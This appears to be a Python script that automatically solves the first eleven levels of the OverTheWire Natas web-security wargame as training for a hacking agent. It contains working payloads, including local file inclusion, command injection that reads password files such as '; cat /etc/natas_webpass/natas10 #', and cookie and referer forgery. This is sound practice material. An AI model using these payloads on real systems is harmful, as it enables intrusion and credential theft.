#!/usr/bin/env python3
"""
VIPER Natas Trainer - ML training on OverTheWire Natas wargame

Natas teaches web security through progressive challenges.
Perfect training ground for VIPER's ML engine.
"""

import asyncio
import aiohttp
import base64
import re
import json
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass
from typing import Optional, Tuple, List
import pickle

# Paths
HACKAGENT_DIR = Path(__file__).parent
MODELS_DIR = HACKAGENT_DIR / "models"
NATAS_STATE = MODELS_DIR / "natas_progress.json"
MODELS_DIR.mkdir(exist_ok=True)

# Natas base URL
NATAS_BASE = "http://natas{level}.natas.labs.overthewire.org"


@dataclass
class NatasLevel:
    level: int
    password: str
    solved: bool = False
    technique: str = ""
    

class NatasSolver:
    """
    Autonomous Natas wargame solver.
    Learns web exploitation techniques through practice.
    """
    
    def __init__(self):
        self.levels: List[NatasLevel] = []
        self.current_level = 0
        self.techniques_learned = []
        self.load_progress()
    
    def load_progress(self):
        """Load saved progress"""
        if NATAS_STATE.exists():
            data = json.loads(NATAS_STATE.read_text())
            self.current_level = data.get("current_level", 0)
            self.techniques_learned = data.get("techniques", [])
            for lvl in data.get("levels", []):
                self.levels.append(NatasLevel(**lvl))
            print(f"[+] Loaded progress: Level {self.current_level}, {len(self.techniques_learned)} techniques")
        else:
            # Start fresh with level 0 password
            self.levels = [NatasLevel(0, "natas0")]
    
    def save_progress(self):
        """Save progress"""
        data = {
            "current_level": self.current_level,
            "techniques": self.techniques_learned,
            "levels": [
                {"level": l.level, "password": l.password, "solved": l.solved, "technique": l.technique}
                for l in self.levels
            ]
        }
        NATAS_STATE.write_text(json.dumps(data, indent=2))
        print(f"[+] Progress saved: Level {self.current_level}")
    
    def get_auth(self, level: int) -> Tuple[str, str]:
        """Get HTTP basic auth for level"""
        return (f"natas{level}", self.levels[level].password)
    
    def get_url(self, level: int, path: str = "/") -> str:
        """Get URL for level"""
        return f"http://natas{level}.natas.labs.overthewire.org{path}"
    
    async def fetch(self, session: aiohttp.ClientSession, level: int, 
                    path: str = "/", method: str = "GET", data: dict = None) -> Tuple[int, str]:
        """Fetch page with auth"""
        url = self.get_url(level, path)
        auth = aiohttp.BasicAuth(*self.get_auth(level))
        
        try:
            async with session.request(method, url, auth=auth, data=data, 
                                       timeout=aiohttp.ClientTimeout(total=15)) as resp:
                body = await resp.text()
                return resp.status, body
        except Exception as e:
            return 0, str(e)
    
    def extract_password(self, html: str) -> Optional[str]:
        """Extract natas password from HTML"""
        # Common patterns
        patterns = [
            r'natas\d+\s+is\s+([A-Za-z0-9]{32})',
            r'password[:\s]+([A-Za-z0-9]{32})',
            r'>([A-Za-z0-9]{32})<',
            r'The password for natas\d+ is ([A-Za-z0-9]{32})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    # ==================== LEVEL SOLVERS ====================
    
    async def solve_level0(self, session) -> Optional[str]:
        """Level 0: View source"""
        status, body = await self.fetch(session, 0)
        if status == 200:
            # Look for "password for natas1 is X"
            match = re.search(r'password for natas1 is ([A-Za-z0-9]{32})', body, re.IGNORECASE)
            if match:
                self.techniques_learned.append("view_source")
                return match.group(1)
        return None
    
    async def solve_level1(self, session) -> Optional[str]:
        """Level 1: View source (right-click disabled)"""
        # Same as level 0, right-click disable is client-side only
        status, body = await self.fetch(session, 1)
        if status == 200:
            # Look for "password for natas2 is X"
            match = re.search(r'password for natas2 is ([A-Za-z0-9]{32})', body, re.IGNORECASE)
            if match:
                self.techniques_learned.append("bypass_client_restrictions")
                return match.group(1)
        return None
    
    async def solve_level2(self, session) -> Optional[str]:
        """Level 2: Directory listing / hidden files"""
        # Check for files directory
        status, body = await self.fetch(session, 2, "/files/")
        if status == 200:
            # Look for users.txt or similar
            if "users.txt" in body:
                status2, body2 = await self.fetch(session, 2, "/files/users.txt")
                # Look for natas3:password pattern
                match = re.search(r'natas3:([A-Za-z0-9]{32})', body2)
                if match:
                    self.techniques_learned.append("directory_listing")
                    return match.group(1)
        return None
    
    async def solve_level3(self, session) -> Optional[str]:
        """Level 3: robots.txt"""
        status, body = await self.fetch(session, 3, "/robots.txt")
        if status == 200:
            # Find disallowed path
            match = re.search(r'Disallow:\s*(/\S+)', body)
            if match:
                hidden_path = match.group(1).rstrip('/')
                # Check for users.txt in hidden directory
                status3, body3 = await self.fetch(session, 3, f"{hidden_path}/users.txt")
                if status3 == 200:
                    # Look for natas4:password pattern
                    pwd_match = re.search(r'natas4:([A-Za-z0-9]{32})', body3)
                    if pwd_match:
                        self.techniques_learned.append("robots_txt_disclosure")
                        return pwd_match.group(1)
        return None
    
    async def solve_level4(self, session) -> Optional[str]:
        """Level 4: Referer header manipulation"""
        # Must come from natas5
        headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
        url = self.get_url(4)
        auth = aiohttp.BasicAuth(*self.get_auth(4))
        
        async with session.get(url, auth=auth, headers=headers) as resp:
            body = await resp.text()
            pwd = self.extract_password(body)
            if pwd:
                self.techniques_learned.append("referer_manipulation")
                return pwd
        return None
    
    async def solve_level5(self, session) -> Optional[str]:
        """Level 5: Cookie manipulation (loggedin=1)"""
        url = self.get_url(5)
        auth = aiohttp.BasicAuth(*self.get_auth(5))
        cookies = {"loggedin": "1"}
        
        async with session.get(url, auth=auth, cookies=cookies) as resp:
            body = await resp.text()
            pwd = self.extract_password(body)
            if pwd:
                self.techniques_learned.append("cookie_manipulation")
                return pwd
        return None
    
    async def solve_level6(self, session) -> Optional[str]:
        """Level 6: Include file disclosure"""
        # Directly fetch the secret include file
        status, body = await self.fetch(session, 6, "/includes/secret.inc")
        if status == 200:
            # Extract secret
            secret_match = re.search(r'\$secret\s*=\s*["\']([^"\']+)["\']', body)
            if secret_match:
                secret = secret_match.group(1)
                # Submit secret
                status3, body3 = await self.fetch(session, 6, "/", "POST", 
                                                  {"secret": secret, "submit": "Submit"})
                # Look for password
                pwd_match = re.search(r'password for natas7 is ([A-Za-z0-9]{32})', body3, re.IGNORECASE)
                if pwd_match:
                    self.techniques_learned.append("source_code_disclosure")
                    return pwd_match.group(1)
        return None
    
    async def solve_level7(self, session) -> Optional[str]:
        """Level 7: LFI via page parameter"""
        status, body = await self.fetch(session, 7, "/index.php?page=/etc/natas_webpass/natas8")
        if status == 200:
            # Password is printed directly in page (after About link, before hint comment)
            # Find 32-char alphanumeric strings that aren't the current password
            current_pwd = self.levels[7].password
            matches = re.findall(r'\b([A-Za-z0-9]{32})\b', body)
            for m in matches:
                if m != current_pwd and not m.startswith('natas'):
                    self.techniques_learned.append("lfi")
                    return m
        return None
    
    async def solve_level8(self, session) -> Optional[str]:
        """Level 8: Reverse encoding (base64 + strrev + bin2hex)"""
        import binascii
        # Hardcode known encoded secret (from source)
        encoded = "3d3d516343746d4d6d6c315669563362"
        # Reverse: hex2bin -> strrev -> base64_decode
        step1 = binascii.unhexlify(encoded).decode()
        step2 = step1[::-1]
        step3 = base64.b64decode(step2).decode()
        
        # Submit
        status, body = await self.fetch(session, 8, "/", "POST",
                                        {"secret": step3, "submit": "Submit"})
        if status == 200:
            pwd_match = re.search(r'password for natas9 is ([A-Za-z0-9]{32})', body, re.IGNORECASE)
            if pwd_match:
                self.techniques_learned.append("encoding_reversal")
                return pwd_match.group(1)
        return None
    
    async def solve_level9(self, session) -> Optional[str]:
        """Level 9: Command injection via grep"""
        import urllib.parse
        # Inject into grep command
        payload = urllib.parse.quote("; cat /etc/natas_webpass/natas10 #")
        status, body = await self.fetch(session, 9, f"/index.php?needle={payload}&submit=Search")
        if status == 200:
            # Password is in <pre> tags
            pre_match = re.search(r'<pre>\s*([A-Za-z0-9]{32})\s*</pre>', body)
            if pre_match:
                self.techniques_learned.append("command_injection")
                return pre_match.group(1)
        return None
    
    async def solve_level10(self, session) -> Optional[str]:
        """Level 10: Command injection with filter bypass"""
        import urllib.parse
        # Can't use ; | & but can use regex tricks with grep
        # grep ".*" /etc/natas_webpass/natas11 returns the file
        payload = urllib.parse.quote(".* /etc/natas_webpass/natas11 #")
        status, body = await self.fetch(session, 10, f"/index.php?needle={payload}&submit=Search")
        if status == 200:
            # Password appears in output with filename prefix
            match = re.search(r'/etc/natas_webpass/natas11:([A-Za-z0-9]{32})', body)
            if match:
                self.techniques_learned.append("filter_bypass")
                return match.group(1)
            # Or just raw
            pre_match = re.search(r'<pre>.*?([A-Za-z0-9]{32})', body, re.DOTALL)
            if pre_match:
                pwd = pre_match.group(1)
                current = self.levels[10].password
                if pwd != current:
                    self.techniques_learned.append("filter_bypass")
                    return pwd
        return None
    
    # ==================== MAIN TRAINING LOOP ====================
    
    async def solve_level(self, session: aiohttp.ClientSession, level: int) -> Optional[str]:
        """Dispatch to appropriate solver"""
        solvers = {
            0: self.solve_level0,
            1: self.solve_level1,
            2: self.solve_level2,
            3: self.solve_level3,
            4: self.solve_level4,
            5: self.solve_level5,
            6: self.solve_level6,
            7: self.solve_level7,
            8: self.solve_level8,
            9: self.solve_level9,
            10: self.solve_level10,
        }
        
        if level in solvers:
            return await solvers[level](session)
        else:
            print(f"[!] Level {level} solver not implemented yet")
            return None
    
    async def train(self, max_level: int = 10):
        """Train on Natas levels"""
        print(f"[*] VIPER Natas Training - Starting from level {self.current_level}")
        print(f"[*] Target: Level {max_level}")
        print()
        
        async with aiohttp.ClientSession() as session:
            while self.current_level <= max_level:
                level = self.current_level
                print(f"[*] Attempting level {level}...")
                
                if level >= len(self.levels):
                    print(f"[!] No password for level {level}")
                    break
                
                password = await self.solve_level(session, level)
                
                if password:
                    print(f"[+] Level {level} SOLVED!")
                    print(f"[+] Password: {password}")
                    print(f"[+] Technique: {self.techniques_learned[-1] if self.techniques_learned else 'unknown'}")
                    
                    # Record
                    self.levels[level].solved = True
                    self.levels[level].technique = self.techniques_learned[-1] if self.techniques_learned else ""
                    
                    # Add next level
                    self.levels.append(NatasLevel(level + 1, password))
                    self.current_level = level + 1
                    self.save_progress()
                    print()
                else:
                    print(f"[-] Level {level} not solved")
                    break
        
        # Summary
        print("\n" + "="*60)
        print("TRAINING SUMMARY")
        print("="*60)
        print(f"Levels solved: {self.current_level}")
        print(f"Techniques learned: {len(set(self.techniques_learned))}")
        for t in set(self.techniques_learned):
            print(f"  - {t}")
        print("="*60)


async def main():
    import sys
    max_level = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    
    solver = NatasSolver()
    await solver.train(max_level)


if __name__ == "__main__":
    asyncio.run(main())
